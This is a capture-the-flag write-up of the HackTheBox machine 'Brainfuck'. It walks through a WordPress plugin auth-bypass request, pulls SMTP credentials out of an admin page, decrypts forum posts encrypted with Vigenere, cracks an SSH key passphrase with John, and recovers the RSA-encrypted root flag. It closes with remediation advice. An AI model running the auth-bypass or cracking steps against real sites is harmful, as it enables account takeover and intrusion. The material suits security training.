# Brainfuck

### A web-to-root writeup: WordPress plugin auth-bypass, mail, Vigenere, SSH key cracking and textbook RSA

[![Category](https://img.shields.io/badge/category-Web%20%2B%20Crypto-important)](https://img.shields.io/badge/category-Web-important)
[![Difficulty](https://img.shields.io/badge/difficulty-Hard-critical)](https://img.shields.io/badge/difficulty-Hard-critical)
[![Tool](https://img.shields.io/badge/tool-WPScan%20%2F%20John%20%2F%20OpenSSL-orange)](https://img.shields.io/badge/tool-...-orange)
[![Vulns](https://img.shields.io/badge/vuln-WP%20plugin%20priv%20esc%20%2B%20Vigenere%20%2B%20SSH%20key%20crack%20%2B%20RSA-red)](https://img.shields.io/badge/vuln-...-red)
[![Flag](https://img.shields.io/badge/flag-user_%26_root-lightgrey)](https://img.shields.io/badge/flag-user_%26_root-lightgrey)

---

> **TL;DR**: The box is a WordPress site on HTTPS with a plugin that lets you log in as any user (an auth bypass, CVE-less but well documented). From the WP admin panel we pull the SMTP credentials out of a settings page, reuse them on IMAP to read `orestis`' inbox, and find a second set of credentials for a "secret" Flarum forum. The forum has a *Key* discussion where every post is Vigenere-encrypted; the key is recoverable and turns into a paste URL holding an SSH private key. The key is passphrase-protected, so it goes to `ssh2john` + `rockyou.txt`. On the box, the root flag isn't lying around: it's been encrypted with RSA, and the author was nice enough to leave `p`, `q` and `e` in a `debug.txt` next to `output.txt`. Decrypt, convert decimal to hex to ASCII, done.

**Goal**, the usual one: read `/root/root.txt`.

## Table of Contents

- [Brainfuck](#brainfuck)
    - [A web-to-root writeup: WordPress plugin auth-bypass, mail, Vigenere, SSH key cracking and textbook RSA](#a-web-to-root-writeup-wordpress-plugin-auth-bypass-mail-vigenere-ssh-key-cracking-and-textbook-rsa)
  - [Table of Contents](#table-of-contents)
  - [Setting up the hostname](#setting-up-the-hostname)
  - [Footprinting](#footprinting)
  - [A self-signed certificate that does the enumeration for us](#a-self-signed-certificate-that-does-the-enumeration-for-us)
  - [WordPress and a plugin that lets you log in as anyone](#wordpress-and-a-plugin-that-lets-you-log-in-as-anyone)
  - [The SMTP page that spills the mail password](#the-smtp-page-that-spills-the-mail-password)
  - [Reading orestis' mail](#reading-orestis-mail)
  - [The secret forum and a Vigenere that isn't so secret](#the-secret-forum-and-a-vigenere-that-isnt-so-secret)
  - [An SSH key with a password nobody remembers](#an-ssh-key-with-a-password-nobody-remembers)
  - [User flag](#user-flag)
  - [Root: RSA, but the parameters were left on the desk](#root-rsa-but-the-parameters-were-left-on-the-desk)
  - [Why this happens / how you'd fix it](#why-this-happens--how-youd-fix-it)
  - [References](#references)

---

## Setting up the hostname

The box answers on its IP, but the whole story is about vhosts, so giving the names a stable mapping early saves a lot of head-scratching later:

```bash
echo "10.129.228.97 brainfuck.htb sup3rs3cr3t.brainfuck.htb" | sudo tee -a /etc/hosts
```

Why two names? You'll see. The second one (`sup3rs3cr3t.brainfuck.htb`, a deliberately misspelled "supersecret") is the forum that matters later. We only know it exists because of the TLS certificate: more on that below.

## Footprinting

A quick TCP sweep first, then service detection on what's open:

```
$ nmap -Pn -sT -T4 --top-ports 2000 10.129.228.97
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
110/tcp open  pop3
143/tcp open  imap
443/tcp open  https
```

Five ports, and the theme is obvious: mail stack (25/110/143) plus SSH and a single HTTPS site. Note that there is **no HTTP on port 80**: everything runs over TLS. That's already a small hint that the site's certificate is going to be doing double duty.

## A self-signed certificate that does the enumeration for us

HTTPS is up, but browsing `https://brainfuck.htb` with the IP would be a dead end. The site is a WordPress install (the `Link:` header advertising the REST API gives it away). The interesting bit is the certificate:

```
$ echo | openssl s_client -connect 10.129.228.97:443 2>/dev/null | openssl x509 -noout -subject -issuer -ext subjectAltName
subject=C = GR, ST = Attica, L = Athens, O = Brainfuck Ltd., OU = IT, CN = brainfuck.htb, emailAddress = orestis@brainfuck.htb
issuer=C = GR, ST = Attica, L = Athens, O = Brainfuck Ltd., OU = IT, CN = brainfuck.htb
X509v3 Subject Alternative Name:
    DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
```

> **Concept**: This is the classic *"the cert is public, use it"* enumeration trick. A self-signed certificate is sometimes the only place on a machine that reveals vhosts and even real usernames. We get two things out of it for free:
> 1. The vhost `sup3rs3cr3t.brainfuck.htb`: an entire second web app we'd never have found by scanning.
> 2. An email address, `orestis@brainfuck.htb`, which is a name we'll see again and again.

A quick check of both hosts confirms the split: `brainfuck.htb` serves WordPress 4.7.3, and `sup3rs3cr3t.brainfuck.htb` serves a Flarum forum (the `X-CSRF-Token` header and `flarum_session` cookie are the giveaway).

## WordPress and a plugin that lets you log in as anyone

Grep the homepage source for plugin/theme paths:

```
$ curl -sk https://brainfuck.htb/ | grep -oE 'wp-content/plugins/[a-z0-9_-]+' | sort -u
wp-content/plugins/wp-support-plus-responsive-ticket-system
```

The `wp-support-plus-responsive-ticket-system` plugin (WP Support Plus Responsive Ticket System) has a well-known, CVE-less but famous privilege-escalation bug documented on Exploit-DB as **41006** (it's also described by its author at `security.szurek.pl`). The root cause is sloppy use of `wp_set_auth_cookie()`: the `loginGuestFacebook` AJAX handler resolves a user from a POSTed username (or email) and then just sets a valid auth cookie for that user: no password check, no nonce, nothing. Logging in as the admin is a one-line request:

```bash
curl -sk -c wpc.txt 'https://brainfuck.htb/wp-admin/admin-ajax.php' \
     --data 'username=admin&email=sth&action=loginGuestFacebook'
```

The response contains three `Set-Cookie` headers for the `admin` user, including the `wordpress_sec_*` cookie that WordPress only issues to authenticated users on the admin side. From then on, sending that cookie with every request is enough to walk into `/wp-admin/`.

> **Tip**: Two operational notes from actually running this on a flaky link:
> 1. The box was *very* slow to respond on the admin pages and occasionally dropped connections mid-TLS. Don't read anything into a `curl: (000)` here: just retry. The auth endpoint answered fine on the second attempt.
> 2. Save your cookies to a jar file with `-c` *and* verify the jar isn't empty before moving on. I had a failed first attempt silently truncate my cookie jar once and spent a minute wondering why the dashboard still said "log in".

Confirm we're in:

```
$ curl -sk -b wpc.txt https://brainfuck.htb/wp-admin/index.php | grep -oE '<title>[^<]*</title>'
<title>Dashboard ‹ Brainfuck Ltd.: WordPress</title>
```

## The SMTP page that spills the mail password

Once inside the dashboard, the pattern is "look at what the admin has been configuring". The site has the **Easy WP SMTP** plugin (`swpsmtp_settings`), reachable under *Settings → Easy WP SMTP*. The plugin pre-fills every field with its saved values: including the password, straight into an `<input type="password">` whose `value` attribute is readable in the page source:

```
$ curl -sk -b wpc.txt 'https://brainfuck.htb/wp-admin/options-general.php?page=swpsmtp_settings' \
  | grep -oE "name='swpsmtp_smtp_(username|password)' value='[^']*'"
name='swpsmtp_smtp_username' value='orestis'
name='swpsmtp_smtp_password' value='kHGuERB29DNiNE'
```

> **Lesson**: a password field in HTML protects your *display*, not your *storage*. If the server sends the secret back to the browser as an attribute value (which many SMTP plugins do, so the form can be re-edited), "view source" is all you need. `type="password"` is a UI feature, not a security boundary.

We now have `orestis:kHGuERB29DNiNE`, and the machine has three mail ports open. Guess where we're going.

## Reading orestis' mail

IMAP is on 143. A small Python `imaplib` script beats typing the protocol by hand, and shows two messages in the inbox:

```
From: WordPress <wordpress@brainfuck.htb>
Subject: New WordPress Site
    "Username: admin / Password: The password you chose during the install."

From: root@brainfuck.htb (root)
Subject: Forum Access Details
    Hi there, your credentials for our "secret" forum are below :)
    username: orestis
    password: kIEnnfEKJ#9UmdO
```

The second email is the payoff: credentials for that "secret" forum we found in the TLS certificate: `sup3rs3cr3t.brainfuck.htb`, which we now know runs Flarum. The author *didn't* reuse the WordPress password here, but they did store credentials in plaintext email, which is just as bad a habit. One interesting thing: the WordPress admin password is never disclosed anywhere, because the plugin bug lets us log in *without* it. The chain so far is essentially one credential guiding us to the next.

## The secret forum and a Vigenere that isn't so secret

Log into the Flarum API with `orestis:kIEnnfEKJ#9UmdO` to get a bearer token, then list the discussions:

```
POST https://sup3rs3cr3t.brainfuck.htb/api/token   {"identification":"orestis","password":"kIEnnfEKJ#9UmdO"}
GET  https://sup3rs3cr3t.brainfuck.htb/api/discussions   (Authorization: Token <token>)
```

```
3 | Key
2 | SSH Access
1 | Development
```

The `Key` discussion is what we want, and its posts are... encrypted:

```
Mya qutf de buj otv rms dy srd vkdof
Pieagnm - Jkoijeg nbw zwx mle grwsnn

mnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja
```

Every post ends with a signature line in the same odd style (`Pieagnm - Jkoijeg nbw zwx mle grwsnn`, `Wejmvse - Fbtkqal zqb rso rnl cwihsf`...). Two observations push us toward **Vigenere**:

1. The "same" phrase appears in each signature, but shifted differently every time: the signature is a fixed string, just re-encrypted. With a Vigenere, a repeated plaintext under a repeated key produces a repeated-but-offset ciphertext, which is exactly the kind of structure that leaks the key length.
2. A URL scheme like `mnvze://` is screaming to be `https://`.

Rather than derive the key by hand (doable, but tedious), compare the repeating signature lines: `Pieagnm - Jkoijeg ...` appears consistently, and if we guess the underlying plaintext is a constant phrase, aligning two signature blocks directly recovers the key characters. For me, that fell out as `fuckmybrain`. Plenty of walkthroughs just hand you this key: deriving it is the "educational" part, and a few minutes with the two signature lines in a cipher solver will do it.

> **Concept**: Vigenere is a polyalphabetic cipher: each letter is shifted by the key character at the same position, and the key repeats. It resists simple frequency analysis (because the same plaintext letter encrypts differently depending on position), but it collapses the moment you (a) guess known plaintext, or (b) notice repeated structures. A Vigenere with a known key is basically a one-line Python function to reverse.

Decrypting the posts with that key:

```
$ python3 vigenere.py --key fuckmybrain  (on the "Key" discussion posts)
There you go you stupid fuck, I hope you remember your key password because I dont
https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
```

The whole "secret" is a **link to a private SSH key** hidden on the web root under a long unguessable path: plus a note that the author themselves forgot the key's password. Perfect segue.

## An SSH key with a password nobody remembers

Grab the key:

```
$ curl -sk https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa -o id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382
```

`Proc-Type: 4,ENCRYPTED` means the key is protected by a passphrase. Converting to a hash John understands and throwing `rockyou.txt` at it:

```
$ python3 /opt/tools/john/run/ssh2john.py id_rsa > id_john
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_john
3poulakia!       (id_rsa)
```

> **Note**: `ssh2john` handles the modern "encrypted" OpenSSH format and the legacy `Proc-Type` PEM format alike. If your `ssh` then refuses the key ("Permission denied (publickey)") when the passphrase is right, the usual culprit is the agent never got the key: headless boxes have no `ssh-askpass`. The fix I used: strip the passphrase locally with `openssl rsa -in id_rsa -out id_rsa_dec -passin 'pass:3poulakia!'` and connect with the clean key. Don't leave that decrypted key on a box you care about.

```
$ ssh -i id_rsa_dec orestis@brainfuck.htb
orestis@brainfuck:~$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
```

Shell as `orestis`. (Worth noting: `adm` group membership, and `lxd`: always worth a second look on a real engagement; this box doesn't need them.)

## User flag

```
orestis@brainfuck:~$ cat user.txt
2c11cfbc5b959f73ac15a3310bd097c9
```

## Root: RSA, but the parameters were left on the desk

`orestis`' home directory has three files that look exactly like a homework exercise left out in the open:

```
$ ls -la /home/orestis/
encrypt.sage   # the encryption script
output.txt     # the encrypted root flag
debug.txt      # p, q, e
```

`encrypt.sage` tells the whole story. It reads `/root/root.txt`, converts the hex string of the flag to an integer, and runs textbook RSA on it:

```python
m = Integer(int(password.encode('hex'),16))
p = random_prime(2^floor(nbits/2)-1, ...)
q = random_prime(2^floor(nbits/2)-1, ...)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)
c = pow(m, e, n)
```

In other words: `c = m^e mod n` with `n = p*q`, and `debug.txt` conveniently contains `p`, `q` and `e`. RSA's whole security story is "factoring `n` is hard", and when someone hands you the factors, decryption is trivial algebra:

1. `n = p·q`
2. `φ(n) = (p-1)·(q-1)`
3. `d = e^{-1} mod φ(n)` (modular inverse)
4. `m = c^d mod n`
5. Convert `m` from decimal to hex, then to ASCII.

```python
n   = p * q
phi = (p - 1) * (q - 1)
d   = pow(e, -1, phi)      # modular inverse
m   = pow(c, d, n)
hx  = format(m, 'x')
if len(hx) % 2: hx = '0' + hx   # pad odd-length hex
print(bytes.fromhex(hx).decode())
```

Which yields the flag:

```
$ python3 decrypt.py
6efc1a5dbb8904751ce6566a305bb8ef
```

> **Concept**: this is the "RSA with known factors" cheat, sometimes called *full private key recovery from p and q*. There's nothing to factor or brute-force: `d` is computed directly once `p` and `q` are known. It's the exact inverse of the attack it's supposed to protect against, and it only works because the author's "debug" file shipped `p` and `q` into the same directory as the ciphertext. Never write `p`, `q`, or `d` to disk next to your encrypted data.

A sanity check that the decrypt is legit and not self-deception: as `orestis`, reading `/root/root.txt` directly is a `Permission denied`. The value we just recovered had to come through the RSA path: which is the whole point.

## Why this happens / how you'd fix it

Each stage of this box is a small, boring, well-known weakness. None of them are exotic: which is why it's a great teaching box.

**Credential reuse / credential hoarding.** One set of mail credentials opened WordPress admin (via a plugin bug), and a second, *different* set opened the forum. But the pattern: plaintext secrets sitting in config pages and emails: is the real disease.

-   Passwords in mail or in `<input type="password" value=...>` are readable by anyone who reaches them. Store secrets outside the docroot, and never ship them back to the browser.
-   Rotate and separate credentials; the SMTP password being also usable for IMAP is exactly the kind of cross-service reuse that makes one leak into total compromise.

**Unvetted WordPress plugins.** `wp-support-plus-responsive-ticket-system` 7.1.3 had a public, trivially exploitable auth bypass (login as anyone, no password). Wordpress admin is one bad plugin away from root, effectively.

-   Keep an inventory of installed plugins; patch or remove abandoned ones. The bug was fixed shortly after the advisory: the box just never updated.

**The Vigenere + passphrase habit.** Old ciphers make fun CTF stages, but the lesson is operational: a key stored in the same place as the data (or in a comment like "I forgot the password") isn't protecting anything. And `rockyou.txt` cracking an SSH passphrase in under a second means the passphrase was weak; if you use a passphrase at all, it has to be strong and unique.

**RSA, done wrong.** The encryption itself used `e` coprime to `φ` and a decent key size, but the entire security of RSA collapses when the factorization leaks. Writing `p`, `q`, `e` to a `debug.txt` next to `output.txt` is the giveaway.

-   Never persist private key material (or its factors) with the ciphertext.
-   Use proper key management (a KMS, or at minimum a protected keystore); "debug files" have a nasty habit of shipping to production.

**Lesson that generalizes**: this whole box is a chain where each step is a *low-trust assumption made by the author*: a certificate that leaks vhosts, a plugin that trusts a POSTed username, a config page that echoes secrets, plaintext mail, a weak cipher, a weak passphrase, and a debug file with the RSA parameters. Fix any single link and the chain breaks. Boxes like this are just practice at noticing that someone, somewhere, trusted something they shouldn't have.

---

`ssl-cert-enumeration` · `wordpress` · `wp-support-plus-responsive-ticket-system` · `auth-bypass` · `smtp` · `imap` · `flarum` · `vigenere` · `ssh2john` · `john` · `rockyou` · `rsa` · `crypto` · `ctf-writeup`

*Writeup for personal and educational purposes on the HackTheBox machine "Brainfuck".*

## References

-   Exploit-DB 41006: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation: [https://www.exploit-db.com/exploits/41006/](https://www.exploit-db.com/exploits/41006/)
-   Kacper Szurek's original advisory: [https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html](https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html)
-   Vigenere cipher: [https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher)
-   `ssh2john` and John the Ripper: [https://www.openwall.com/john/](https://www.openwall.com/john/)
-   RSA (Wikipedia): [https://en.wikipedia.org/wiki/RSA_(cryptosystem)](https://en.wikipedia.org/wiki/RSA_(cryptosystem))
-   The crypto.SE answer used for RSA decryption: [https://crypto.stackexchange.com/a/19530](https://crypto.stackexchange.com/a/19530)
